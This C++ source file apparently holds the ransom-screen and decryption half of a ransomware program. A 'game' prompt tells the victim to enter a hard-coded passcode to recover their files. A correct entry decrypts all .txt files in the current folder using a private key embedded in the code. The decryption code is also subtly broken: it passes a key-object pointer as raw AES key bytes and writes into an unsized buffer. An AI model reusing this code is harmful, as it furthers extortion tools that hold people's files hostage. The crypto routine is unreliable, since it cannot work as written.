#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <string>
#include <fstream>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/pem.h>

const std::string key = "-----BEGIN PRIVATE KEY-----\n"
"MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDCfGwc94eDT+Ft\n"
"8yIK+Vn6Cv4gTOAZT90v1BBq21QKk1oiDZL5tjWlJSn9bqTid1GPisME5zhMJeFC\n"
"l193quW89i+uJmXa8Qmo/npW7jtCZaMUFjAvlTJllvqOb6MGn8uPeKZuoKhCx9IW\n"
"AwvVWOm5xjA4ppsxsgxS/p8FHuGScaObZX79VizCs29gP789aZnebxeQyxovaZ+v\n"
"Yb45TijcOx5oHmtYMML3OJxWWZgEUXsW61hTd5qwDQTfQE513lWRMiO4kleOGcf5\n"
"fSRddVObZqSJznf7GJDutRnO5lfPLPzecfQnGXsKaXCJCZZ7Sjb7MJWa9gzXN0tL\n"
"qWwLAWnxAgMBAAECggEADX9+L2p8lMAECNIBkFprBMAjkBFV0lvpIYsp0ojDZfKB\n"
"JHDlvQAI7BvOtMCrn+4hEoHSdDIqBZrxbeI8pX0OcdVyTLdshUwKXBjBW+wv37VX\n"
"IqtBj+Peeg+G90DHQ0vu4FfC0VXEJ9JfgdiXRyjjG9ol+aCSj9noIhB67+uLQ1MR\n"
"w8gRiN64mhUXaKvcZPMOZdinR2e+rECvLMLFzIoGliSQmK70Iu+U/Rjm67M1MEDT\n"
"ZUtR8tfxt0x9eZ5P2oxKnlpZyKwAekpnDk53i+sEYPGPkI3UHllIKXSOAd16IyJk\n"
"A0ohtavpb0ftZK3Sb9JxJLxwL1CidddNbg9wCF6zoQKBgQDpCStxmkmljVo4m9Et\n"
"fN42zUnJDW4UshQA8aB2YeheYW3MT5/Log8WKKli9sa3x3ZcEh8rG4+JktuZhlb1\n"
"TNHF7AtEMr3BZLf3PrsMfiBwAwv2DL3eSGIs8Fn+6z0CMu3GY0kNxU8eXDEUy9fk\n"
"wKEZyKi0auSaX938n0GgOTVPaQKBgQDVpsBEjAlD7xjpcuRO5kGjO/lCPYQFSvET\n"
"auHdXas8eFEtN4DbbuTdwysgAy3bAXL9lI777xyEwq305Sac9dLyYl/oVGYC940F\n"
"SREQyYv5A0QOPxNu1EMm6fgw5nLEwveyqGcQUsjO7DkNVPJ7k9UoKZPJrPf99pac\n"
"k2xvKVv9SQKBgQDnErGiZyQp5d0VjuQ/X7cUzkEg/JEwMliFixLa8ECy/ZcbZcUE\n"
"7cBZ753uxNbNOxrRNyLy4tRUzWu1czFc8Xx87o9JY6snTlDg+LIPNC3EBDFjHMVU\n"
"2Z+IAhirHuWS/Z8q/h5dak4Gw9HjVjHQ4XWdlIw8wlXGAdOkAOLZFoEXKQKBgHDa\n"
"EKrkcSxyCe2do1zNoRQQ5LuJdMe66xX/mehsxrs9Llu8+pJtw/QjWA8jvr/0xwGM\n"
"y+3lQmIZ1vsJY1j7O/6N2e0FT5D3o4SMMLh2TTot8G+5/5DGC+ZtJYzm3O5zsZSs\n"
"ASyNHca23ffdy+tcjfYV6BtaAvAhpTJ1aIxbA10JAoGACWj9hGH+o2opmclhPce2\n"
"a6j1Dc+MlnBlzOqEPCshARvc1E7ohH1iNr2e7I1SHFWZwQeWPj2V7eyxaIywPrkV\n"
"p3XNyx3Ktkr0Gh57HUqVMCaQ6U8/h3WSftqAIGv5+BHPgzVJgfDFcB7Ydo1Lng5V\n"
"Xu7ZoplsIb2HSxCQC1I/FnM=\n"
"-----END PRIVATE KEY-----\n";

void decryptFile(const std::filesystem::path filename)
{
    // Load the private key from a file
    //std::ifstream keyFile("privatekey.pem");
    //std::string key((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());

    // Create an EVP_PKEY structure and load the private key into it
    EVP_PKEY* pkey = EVP_PKEY_new();
    BIO* keyBio = BIO_new_mem_buf(key.c_str(), key.size());
    PEM_read_bio_PrivateKey(keyBio, &pkey, nullptr, nullptr);
    BIO_free(keyBio);

    // Read the encrypted data from a file
    std::ifstream dataFile(filename, std::ios::binary);
    std::string data((std::istreambuf_iterator<char>(dataFile)), std::istreambuf_iterator<char>());

    // Create an EVP_CIPHER_CTX structure and initialize it for decryption
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_set_padding(ctx, 1);
    EVP_DecryptInit_ex(ctx, nullptr, nullptr, nullptr, nullptr);
    EVP_DecryptInit_ex(ctx, nullptr, nullptr, (const unsigned char*)pkey, nullptr);

    // Decrypt the data
    int outlen1, outlen2;
    std::vector<unsigned char> outbuf;
    outbuf.reserve(8192);
    EVP_DecryptUpdate(ctx, outbuf.data(), &outlen1, (const unsigned char*)data.c_str(), data.size());

    // Finalize the decryption process
    EVP_DecryptFinal_ex(ctx, outbuf.data() + outlen1, &outlen2);

    // Write the decrypted data to a file
    std::ofstream outFile(filename);
    outFile.write((char*)outbuf.data(), outlen1 + outlen2);

    // Clean up
    EVP_CIPHER_CTX_free(ctx);
    EVP_PKEY_free(pkey);
}


bool playGame(std::string passcode)
{
    if (passcode == "La seguridad informatica es muy importante")
        return true;
    
    else
        return false;
}

int main()
{
    std::cout << "Welcome! In order to recover your files you should win this game.\n";
    std::cout << "In order to win, you have to introduce a passcode. Hint: it's a string\n";

    while (1)
    {
        std::string passcode;
        std::cout << "Enter the passcode: ";
        std::getline(std::cin, passcode);

        if (playGame(passcode))
        {
            std::cout << "You win!\n Decrypting the files...";
            Sleep(2000);

            std::string path = ".";
            std::filesystem::path extension = "";

            for (const auto& entry : std::filesystem::directory_iterator(path))
            {
                extension = std::filesystem::path(entry.path()).extension();

                if (extension == ".txt")
                    decryptFile(entry.path());
            }

            std::cout << "Done!\n Congratulations! Your files were recovered!\n";
            std::cout << "Press F2 to exit!";
            while (1)
                if (GetAsyncKeyState(VK_F2))
                    exit(1);
        }

        else
            std::cout << "Incorrect! Try again!\n";
    }
}

